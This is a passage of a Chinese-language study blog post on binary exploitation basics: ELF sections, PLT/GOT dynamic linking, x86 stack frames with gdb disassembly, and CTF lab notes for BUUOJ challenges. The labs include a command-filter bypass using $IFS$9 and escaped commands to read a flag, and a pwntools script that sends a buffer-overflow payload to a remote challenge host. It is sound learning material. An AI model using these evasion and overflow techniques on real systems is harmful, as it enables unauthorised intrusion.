<li><code>.init</code> 节中的代码通常是一些需要在 <code>main</code> 函数之前执行的初始化任务，比如在 C++ 中调用全局构造函数或执行一些启动例程。</li>
</ul>
<h4 id="段"><a href="#段" class="headerlink" title="段"></a>段</h4><h3 id="PLT和GOT"><a href="#PLT和GOT" class="headerlink" title="PLT和GOT"></a>PLT和GOT</h3><p>在介绍PLT和GOT出场之前，先以一个简单的例子引入两个主角，各位请看以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void print_banner()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Welcome to World of PLT and GOT\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>编译:</strong></p>
<blockquote>
<p>gcc -Wall -g -o test.o -c test.c -m32</p>
</blockquote>
<p><strong>链接:</strong></p>
<blockquote>
<p>gcc -o test test.o -m32</p>
</blockquote>
<p>注意：现代Linux系统都是x86_64系统了，后面需要对中间文件test.o以及可执行文件test反编译，分析汇编指令，因此在这里使用-m32选项生成i386架构指令而非x86_64架构指令。</p>
<p>经编译和链接阶段之后，test可执行文件中print_banner函数的汇编指令会是怎样的呢？我猜应该与下面的汇编类似：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">080483cc &lt;print_banner&gt;:</span><br><span class="line"> 80483cc:    push %ebp</span><br><span class="line"> 80483cd:    mov  %esp, %ebp</span><br><span class="line"> 80483cf:    sub  $0x8, %esp</span><br><span class="line"> 80483d2:    sub  $0xc, %esp</span><br><span class="line"> 80483d5:    push $0x80484a8  </span><br><span class="line"> 80483da:    call **&lt;printf函数的地址&gt;**</span><br><span class="line"> 80483df:    add $0x10, %esp</span><br><span class="line"> 80483e2:    nop</span><br><span class="line"> 80483e3:    leave</span><br><span class="line"> 80483e4:    ret</span><br></pre></td></tr></table></figure>

<p>print_banner函数内调用了printf函数，而printf函数位于glibc动态库内，所以在编译和链接阶段，链接器无法知知道进程运行起来之后printf函数的加载地址。故上述的**<code>**&lt;printf函数地址&gt;**</code>** 一项是无法填充的，只有进程运运行后，printf函数的地址才能确定。</p>
<p>那么问题来了：<strong>进程运行起来之后，glibc动态库也装载了，printf函数地址亦已确定，上述call指令如何修改（重定位）呢？</strong></p>
<p>一个简单的方法就是将指令中的**<code>**&lt;printf函数地址&gt;**</code>**修改printf函数的真正地址即可。</p>
<p>但这个方案面临两个问题：</p>
<blockquote>
<ul>
<li>现代操作系统不允许修改代码段，只能修改数据段</li>
<li>如果print_banner函数是在一个动态库（.so对象）内，修改了代码段，那么它就无法做到系统内所有进程共享同一个动态库。</li>
</ul>
</blockquote>
<p><strong>因此，printf函数地址只能回写到数据段内，而不能回写到代码段上。</strong></p>
<p>注意：刚才谈到的回写，是指运行时修改，更专业的称谓应该是<strong>运行时重定位</strong>，与之相对应的还有<strong>链接时重定位</strong>。</p>
<p>说到这里，需要把编译链接过程再展开一下。我们知道，每个编译单元（通常是一个.c文件，比如前面例子中的test.c）都会经历编译和链接两个阶段。</p>
<p>编译阶段是将.c源代码翻译成汇编指令的中间文件，比如上述的test.c文件，经过编译之后，生成test.o中间文件。print_banner函数的汇编指令如下（使用强调内容<strong>objdump -d test.o</strong>命令即可输出）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00000000 &lt;print_banner&gt;:</span><br><span class="line">      0:  55                   push %ebp</span><br><span class="line">      1:  89 e5                mov %esp, %ebp</span><br><span class="line">      3:  83 ec 08             sub   $0x8, %esp</span><br><span class="line">      6:  c7 04 24 00 00 00 00 movl  $0x0, (%esp)</span><br><span class="line">      d:  e8 fc ff ff ff       call  e &lt;print_banner+0xe&gt;</span><br><span class="line">     12:  c9                   leave</span><br><span class="line">     13:  c3                   ret</span><br></pre></td></tr></table></figure>

<p>是否注意到call指令的操作数是fc ff ff ff，翻译成16进制数是0xfffffffc（x86架构是小端的字节序），看成有符号是-4。这里应该存放printf函数的地址，但由于编译阶段无法知道printf函数的地址，所以预先放一个-4在这里，然后用重定位项来描述：<strong>这个地址在链接时要修正，它的修正值是根据printf地址（更确切的叫法应该是符号，链接器眼中只有符号，没有所谓的函数和变量）来修正，它的修正方式按相对引用方式</strong>。</p>
<p>这个过程称为<strong>链接时重定位</strong>，与刚才提到的运行时重定位工作原理完全一样，只是修正时机不同。</p>
<p><strong>链接阶段</strong>是将一个或者多个中间文件（.o文件）通过链接器将它们链接成一个可执行文件，链接阶段主要完成以下事情：</p>
<blockquote>
<ul>
<li>各个中间文之间的同名section合并</li>
<li>对代码段，数据段以及各符号进行地址分配</li>
<li>链接时重定位修正</li>
</ul>
</blockquote>
<p>除了重定位过程，其它动作是无法修改中间文件中函数体内指令的，而重定位过程也只能是修改指令中的操作数，换句话说，<strong>链接过程无法修改编译过程生成的汇编指令</strong>。</p>
<p>那么问题来了：<strong>编译阶段怎么知道printf函数是在glibc运行库的，而不是定义在其它.o中</strong></p>
<p>答案往往令人失望：<strong>编译器是无法知道的</strong></p>
<p>那么编译器只能老老实实地生成调用printf的汇编指令，printf是在glibc动态库定位，或者是在其它.o定义这两种情况下，它都能工作。如果是在其它.o中定义了printf函数，那在链接阶段，printf地址已经确定，可以直接重定位。如果printf定义在动态库内（链接阶段是可以知道printf在哪定义的，只是如果定义在动态库内不知道它的地址而已），链接阶段无法做重定位。</p>
<p>根据前面讨论，运行时重定位是无法修改代码段的，只能将printf重定位到数据段。那在编译阶段就已生成好的call指令，怎么感知这个已重定位好的数据段内容呢？</p>
<p>答案是：<strong>链接器生成一段额外的小代码片段，通过这段代码支获取printf函数地址，并完成对它的调用</strong>。</p>
<p>链接器生成额外的伪代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">printf_stub:</span><br><span class="line">    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址</span><br><span class="line">    jmp rax // 跳过去执行printf函数</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的储存地址：</span><br><span class="line">　　这里储存printf函数重定位后的地址</span><br></pre></td></tr></table></figure>

<p>链接阶段发现printf定义在动态库时，链接器生成一段小代码print_stub，然后printf_stub地址取代原来的printf。因此转化为链接阶段对printf_stub做链接重定位，而运行时才对printf做运行时重定位。</p>
<h4 id="动态链接姐妹花PLT与GOT"><a href="#动态链接姐妹花PLT与GOT" class="headerlink" title="动态链接姐妹花PLT与GOT"></a>动态链接姐妹花PLT与GOT</h4><p>前面由一个简单的例子说明动态链接需要考虑的各种因素，但实际总结起来说两点：</p>
<blockquote>
<ul>
<li>需要存放外部函数的数据段</li>
<li>获取数据段存放函数地址的一小段额外代码</li>
</ul>
</blockquote>
<p>如果可执行文件中调用多个动态库函数，那每个函数都需要这两样东西，这样每样东西就形成一个表，每个函数使用中的一项。</p>
<p>总不能每次都叫这个表那个表，于是得正名。存放函数地址的数据表，称为<strong>重局偏移表</strong>（GOT, Global Offset Table），而那个额外代码段表，称为<strong>程序链接表</strong>（PLT，Procedure Link Table）。<strong>它们两姐妹各司其职，联合出手上演这一出运行时重定位好戏</strong>。</p>
<p>那么PLT和GOT长得什么样子呢？前面已有一些说明，下面以一个例子和简单的示意图来说明PLT&#x2F;GOT是如何运行的。</p>
<p>假设最开始的示例代码test.c增加一个write_file函数，在该函数里面调用glibc的write实现写文件操作。根据前面讨论的PLT和GOT原理，test在运行过程中，调用方（如print_banner和write_file)是如何通过PLT和GOT穿针引线之后，最终调用到glibc的printf和write函数的？</p>
<p>我简单画了PLT和GOT雏形图，供各位参考。</p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161610513.png" alt="image-20241016160853107"></p>
<p>当然这个原理图并不是Linux下的PLT&#x2F;GOT真实过程，Linux下的PLT&#x2F;GOT还有更多细节要考虑了。这个图只是将这些躁声全部消除，让大家明确看到PLT&#x2F;GOT是如何穿针引线的。</p>
<h2 id="进程执行"><a href="#进程执行" class="headerlink" title="进程执行"></a>进程执行</h2><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161411482.png" alt="image-20241016141116434"></p>
<h3 id="程序装载和虚拟内存"><a href="#程序装载和虚拟内存" class="headerlink" title="程序装载和虚拟内存"></a>程序装载和虚拟内存</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161130221.png" alt="image-20241016113040172"></p>
<blockquote>
<p>段：程序加载到内存后，读写执行程序权限划分</p>
<p>节：功能区域划分</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161131942.png" alt="image-20241016113123886"></p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161133434.png" alt="image-20241016113326379"></p>
<blockquote>
<p>只占据了data和code</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161134292.png" alt="image-20241016113442250"></p>
<h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161141494.png" alt="imag e-20241016114135460"></p>
<blockquote>
<p>虚拟内存中有多个动态链接库，物理内存中只有一个</p>
<p>kernel虚拟内存中只有一个 </p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161149792.png" alt="image-20241016114959736"></p>
<h3 id="程序状态与汇编"><a href="#程序状态与汇编" class="headerlink" title="程序状态与汇编"></a>程序状态与汇编</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161421365.png" alt="image-20241016142115319"></p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161425199.png" alt="image-20241016142526142"></p>
<h1 id="Linux函数调用栈的实现原理（X86）"><a href="#Linux函数调用栈的实现原理（X86）" class="headerlink" title="Linux函数调用栈的实现原理（X86）"></a>Linux函数调用栈的实现原理（X86）</h1><h2 id="内存结构"><a href="#内存结构" class="headerlink" title="内存结构"></a>内存结构</h2><p>二进制程序执行时的内存结构：</p>
<ul>
<li>code section：保存程序执行指令的机器码。</li>
<li>static section：在程序执行期间不改变的常量和静态变量。</li>
<li>heap：使用malloc申请的堆内存，向内存地址升序的方向生长：grows up。</li>
<li>stack：保存函数局部变量和函数调用的控制信息，向内存地址降序的方向生长：grows down。</li>
</ul>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/ffdc898adc5f461b71522585385ed12e.png" alt="在这里插入图片描述"></p>
<ul>
<li>（32位系统）程序的虚拟内存空间提供了2^32^ 的空间保存数据，用户地址空间3G从0x0000000到0xC0000000，内核空间1G从0xC0000000到0xFFFFFFFF。</li>
<li>（64位系统）程序的虚拟内存空间提供了2^64^ 的空间保存数据，用户地址空间128T从0x0000 0000 0000 0000到0x0000 7FFF FFFF F0000，内核空间128T从0xFFFF 8000 0000 0000到0xFFFF FFFF FFFF FFFF。</li>
</ul>
<h2 id="寄存器-1"><a href="#寄存器-1" class="headerlink" title="寄存器"></a>寄存器</h2><blockquote>
<p>寄存器提供了额外的存储空间，每个寄存器可以存一个字（4字节）。没有e拓展的寄存器只能存半个字（2字节）。</p>
<p>x86有六个通用寄存器和三个特殊寄存器</p>
</blockquote>
<p>和函数调用相关的寄存器（e表示扩展的意思）：</p>
<ul>
<li>eip：指令指针，存储当前正在执行的机器指令的地址。也叫PC（程序计数器）。</li>
<li>ebp：帧指针，保存当前栈帧顶部地址（高地址）。</li>
<li>esp：堆栈指针，保存当前堆栈底部地址（低地址）。</li>
</ul>
<p>下图便于理解：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">|----------------------|  high address</span><br><span class="line">|        ...           |</span><br><span class="line">|-------frame----------|</span><br><span class="line">|        ...           |</span><br><span class="line">|        ...           |</span><br><span class="line">|        ...           |</span><br><span class="line">|-------frame----------|   # current frame     &lt;----- ebp</span><br><span class="line">|        ...           |</span><br><span class="line">|        ...           |</span><br><span class="line">|        ...           |                       &lt;----- esp</span><br><span class="line">|----------------------|  low address</span><br></pre></td></tr></table></figure>

<h2 id="x86基础"><a href="#x86基础" class="headerlink" title="x86基础"></a>x86基础</h2><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151546319.png" alt="image-20241015154641104"></p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151548575.png" alt="image-20241015154845474"></p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151549071.png" alt="image-20241015154931881"></p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151554838.png" alt="image-20241015155442574"></p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151614658.png" alt="image-20241015161445539"></p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151612277.png" alt="image-20241015161241181"></p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151655740.png" alt="image-20241015165538660"></p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151656889.png" alt="image-20241015165649849"></p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151657508.png" alt="image-20241015165743268"></p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410160011560.png" alt="image-20241016001130350"></p>
<blockquote>
<p>mov指令不支持两个数都来自主存</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410160018028.png" alt="image-20241016001807867"></p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410160022846.png" alt="image-20241016002254693"></p>
<h2 id="x86函数调用"><a href="#x86函数调用" class="headerlink" title="x86函数调用"></a>x86函数调用</h2><ul>
<li><p>当需要调用另一个函数时，栈空间需要生长，用来保存一些局部变量 或者 寄存器信息。</p>
</li>
<li><p>当调用函数发生时，caller执行逻辑会跳转到callee，拿到结果后，再跳转会caller。这就需要改变下面几个寄存器的值：</p>
</li>
</ul>
<p>​			eip指令指针，需要改成指向callee的指令。<br>​			ebp 和 esp 当前分别指向caller栈帧的顶部和底部。两个寄存器都需要更新为 指向callee的新栈帧的顶部和底部。</p>
<ul>
<li>当函数返回时，需要恢复寄存器中的旧值，才可以返回caller。所以更新寄存器的值，需要将它的旧值保存在堆栈中，以便在函数返回后恢复旧值。</li>
</ul>
<p>下面是main调用foo的执行过程：</p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410160022220.png" alt="image-20241016002235173"></p>
<h3 id="step1：参数入栈"><a href="#step1：参数入栈" class="headerlink" title="step1：参数入栈"></a>step1：参数入栈</h3><p>将参数压入堆栈。 x86将参数压入堆栈来传递参数。请注意，当我们将参数压入堆栈时，<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=esp&spm=1001.2101.3001.7020">esp</a> 会递减。参数以相反的顺序压入堆栈。（上面是高地址）</p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151149015.png" alt="在这里插入图片描述"></p>
<h3 id="step2：旧的eip入栈"><a href="#step2：旧的eip入栈" class="headerlink" title="step2：旧的eip入栈"></a>step2：旧的eip入栈</h3><p>旧的eip（<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=rip&spm=1001.2101.3001.7020">rip</a>）压入堆栈。跳转到子函数执行eip需要指向子函数，所以这里先保存下。</p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151156887.png" alt="在这里插入图片描述"></p>
<h3 id="step3：修改eip指向"><a href="#step3：修改eip指向" class="headerlink" title="step3：修改eip指向"></a>step3：修改eip指向</h3><p>已经保存了 eip 的旧值，可以安全地将 eip 更改为指向被callee的指令。</p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151157476.png" alt="在这里插入图片描述"></p>
<h3 id="step4：将旧的ebp入栈"><a href="#step4：将旧的ebp入栈" class="headerlink" title="step4：将旧的ebp入栈"></a>step4：将旧的ebp入栈</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151157859.png" alt="在这里插入图片描述"></p>
<h3 id="step5：ebp向下移动指向新栈帧顶部"><a href="#step5：ebp向下移动指向新栈帧顶部" class="headerlink" title="step5：ebp向下移动指向新栈帧顶部"></a>step5：ebp向下移动指向新栈帧顶部</h3><p>这就是<code>mov %esp %ebp</code>的含义：</p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151157009.png" alt="在这里插入图片描述"></p>
<h3 id="step6：esp向下移动"><a href="#step6：esp向下移动" class="headerlink" title="step6：esp向下移动"></a>step6：esp向下移动</h3><p>通过sub esp（esp地址–） 来为新栈帧分配新空间。编译器会根据函数的复杂度确定 esp 应该减少多少。</p>
<ul>
<li>例如，只有几个局部变量的函数不需要太多的堆栈空间，因此 esp 只会减少几个字节。</li>
<li>例如，如果一个函数将一个大数组声明为一个局部变量，那么 esp 会减少很多来适应堆栈中的数组。</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151157157.png" alt="在这里插入图片描述"></p>
<h3 id="step7：执行callee"><a href="#step7：执行callee" class="headerlink" title="step7：执行callee"></a>step7：执行callee</h3><p>现在堆栈中已经保存了函数的局部变量和跳转控制信息；由于ebp指向栈帧的顶部，所以可以用ebp+8找到第一个参数的保存位置。</p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151158821.png" alt="在这里插入图片描述"></p>
<h3 id="step8：返回esp回到堆栈顶部"><a href="#step8：返回esp回到堆栈顶部" class="headerlink" title="step8：返回esp回到堆栈顶部"></a>step8：返回esp回到堆栈顶部</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151414410.png" alt="image-20241015141436324"></p>
<h3 id="step9：恢复旧的ebp"><a href="#step9：恢复旧的ebp" class="headerlink" title="step9：恢复旧的ebp"></a>step9：恢复旧的ebp</h3><p>使用esp从堆栈中pop出一个值（old ebp），把old ebp的值赋给ebp。</p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151158831.png" alt="在这里插入图片描述"></p>
<h3 id="step10：弹出eip"><a href="#step10：弹出eip" class="headerlink" title="step10：弹出eip"></a>step10：弹出eip</h3><p>继续使用esp弹出old eip的值赋给eip。</p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151415780.png" alt="image-20241015141502705"></p>
<h3 id="step11：从堆栈中删除参数"><a href="#step11：从堆栈中删除参数" class="headerlink" title="step11：从堆栈中删除参数"></a>step11：从堆栈中删除参数</h3><p>继续讲堆栈上的参数弹出到寄存器，然后删除esp栈顶以下的元素。栈顶以下的元素已经不在栈中，没有意义。</p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151415222.png" alt="image-20241015141512169"></p>
<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    foo(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> bar[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gcc -O0 t.c -o t -g</span><br></pre></td></tr></table></figure>

<h3 id="main执行过程"><a href="#main执行过程" class="headerlink" title="main执行过程"></a>main执行过程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble /rm</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">3       int main(void) &#123;</span><br><span class="line">                                                                 # 由_start调入main函数</span><br><span class="line">   0x0000000000401122 &lt;+0&gt;:     55              push   %rbp      # 栈帧顶部入栈</span><br><span class="line">   0x0000000000401123 &lt;+1&gt;:     48 89 e5        mov    %rsp,%rbp # 栈帧顶部指针rbp指向新栈帧顶部</span><br><span class="line"></span><br><span class="line">4           foo(1, 2);</span><br><span class="line">=&gt; 0x0000000000401126 &lt;+4&gt;:     be 02 00 00 00  mov    $0x2,%esi # 参数1入寄存器传递</span><br><span class="line">   0x000000000040112b &lt;+9&gt;:     bf 01 00 00 00  mov    $0x1,%edi # 参数2入寄存器传递</span><br><span class="line">   0x0000000000401130 &lt;+14&gt;:    e8 07 00 00 00  callq  0x40113c &lt;foo&gt;   # push %rip 然后 jmpq</span><br><span class="line">                                                                        # push %rip 等价与 sub $0x8, %rsp </span><br><span class="line">                                                                        #                 mov $rip, %rsp</span><br><span class="line"></span><br><span class="line">   0x0000000000401135 &lt;+19&gt;:    b8 00 00 00 00  mov    $0x0,%eax</span><br><span class="line"></span><br><span class="line">5       &#125;</span><br><span class="line">   0x000000000040113a &lt;+24&gt;:    5d              pop    %rbp             # 先恢复rbp的值</span><br><span class="line">   0x000000000040113b &lt;+25&gt;:    c3              retq                    # 在恢复rip的值 popq %rip</span><br><span class="line"></span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<h3 id="foo函数"><a href="#foo函数" class="headerlink" title="foo函数"></a>foo函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble /rm</span><br><span class="line">Dump of assembler code for function foo:</span><br><span class="line">7       void foo(int a, int b) &#123;</span><br><span class="line">   0x000000000040113c &lt;+0&gt;:     55              push   %rbp              # 帧顶位置 入栈</span><br><span class="line">   0x000000000040113d &lt;+1&gt;:     48 89 e5        mov    %rsp,%rbp         # rbp帧顶指针，指向新帧顶</span><br><span class="line">   0x0000000000401140 &lt;+4&gt;:     89 7d ec        mov    %edi,-0x14(%rbp)  # 参数2入栈（先压最后一个参数入栈）</span><br><span class="line">   0x0000000000401143 &lt;+7&gt;:     89 75 e8        mov    %esi,-0x18(%rbp)  # 参数1入栈</span><br><span class="line"></span><br><span class="line">8           int bar[4];</span><br><span class="line">9       &#125;</span><br><span class="line">=&gt; 0x0000000000401146 &lt;+10&gt;:    90              nop</span><br><span class="line">   0x0000000000401147 &lt;+11&gt;:    5d              pop    %rbp  # 先恢复rbp的值</span><br><span class="line">   0x0000000000401148 &lt;+12&gt;:    c3              retq         # 在恢复rip的值 popq %rip</span><br><span class="line"></span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<h1 id="ShellCode"><a href="#ShellCode" class="headerlink" title="ShellCode"></a>ShellCode</h1><p>作用：</p>
<ul>
<li>1.启动shell，进行交互</li>
<li>2.打开服务器端口等待连接</li>
<li>3.反向连接端口</li>
<li>4.。。。。</li>
</ul>
<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="实验一-nc的使用与系统命令执行"><a href="#实验一-nc的使用与系统命令执行" class="headerlink" title="实验一 nc的使用与系统命令执行"></a>实验一 nc的使用与系统命令执行</h2><blockquote>
<p>域名:端口号       如node5.buuoj.cn:27241<br>IP地址:端口号     如192.168.32.12:10001</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接远程端口获得文件信息</span></span><br><span class="line">nc node5.buuoj.cn 27241</span><br><span class="line">ll</span><br><span class="line">cat flag</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果设置了blacklist,那就要进行绕过过滤，$IFS<span class="variable">$9</span>可以替换空格</span></span><br><span class="line">l\l</span><br><span class="line">c\at$IFS$9flag</span><br></pre></td></tr></table></figure>

<h2 id="实验二-权限提升"><a href="#实验二-权限提升" class="headerlink" title="实验二 权限提升"></a>实验二 权限提升</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看文件基础信息</span></span><br><span class="line">checksec --file=Re_or_pwn</span><br><span class="line">file Re_or_pwn</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现文件是64位的，使用IDA64打开反编译</span></span><br></pre></td></tr></table></figure>

<h2 id="实验三-向数组填充数据并简单写一个攻击脚本"><a href="#实验三-向数组填充数据并简单写一个攻击脚本" class="headerlink" title="实验三 向数组填充数据并简单写一个攻击脚本"></a>实验三 向数组填充数据并简单写一个攻击脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编写attck.py文件，使用pwntools</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立远程连接</span></span><br><span class="line">p=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25094</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span>+p32(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 它的作用是将程序的标准输入和输出连接到当前的终端，允许你与目标程序进行交互。</span></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>

<h2 id="实验四-栈溢出"><a href="#实验四-栈溢出" class="headerlink" title="实验四 栈溢出"></a>实验四 栈溢出</h2><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410141804606.png" alt="image-20241014180435394"></p>
<p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410141800529.png" alt="栈在内存"></p>
